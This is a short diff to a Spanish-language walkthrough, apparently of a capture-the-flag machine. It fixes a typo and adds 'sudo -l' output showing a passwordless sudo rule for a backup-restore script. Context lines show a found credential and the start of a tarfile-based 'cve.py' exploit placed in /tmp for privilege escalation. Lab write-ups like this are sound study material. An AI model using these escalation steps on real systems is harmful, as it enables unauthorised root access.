@@ -58,11 +58,16 @@ wacky::!#7Blushing^*Bride5
 ```
 
 Obteniendo una shell como `wacky`
- ejecutamos el comonado 
+ ejecutamos el comando 
  ```shell
  sudo -l
  ```
-
+ 
+ Y vemos que nos devuelve
+ ```shell
+ NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py
+ ```
+ 
 En `/tmp` crearemos un archivo llamado `cve.py`
 ```python
 import tarfile
